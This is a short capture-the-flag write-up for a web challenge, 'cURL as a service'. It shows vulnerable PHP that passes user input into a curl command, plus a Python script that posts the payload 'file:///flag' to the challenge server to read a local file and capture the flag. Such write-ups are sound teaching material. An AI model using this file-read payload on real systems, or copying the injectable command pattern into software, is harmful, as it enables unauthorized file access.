# Caas - cURL as a service

## Description

cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.aw man, aw geez, my grandpa rick is passed out from all the drinking again, where is a calculator when you need one, aw geez
This challenge will raise 43 euros for a good cause.

## Solution

Downloading the source and examining it we see that we control a post body variable ip, which is passed into a curl command

```php
<?php
class CommandModel
{
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
}
```

now because of escapeshellcmd, we can't simply break out of curl and cat the flag, but can we read local files with curl directly? yes!

```bash
curl -sL file:///flag
```

```py
import requests

body = { "ip": "file:///flag"}

r= requests.post(
    "http://46.101.77.180:31089/api/curl",            
    data=body,
    headers={'Content-Type': 'application/x-www-form-urlencoded'}
)

print(r.text)
```

CHTB{f1le_r3trieval_4s_a_s3rv1ce}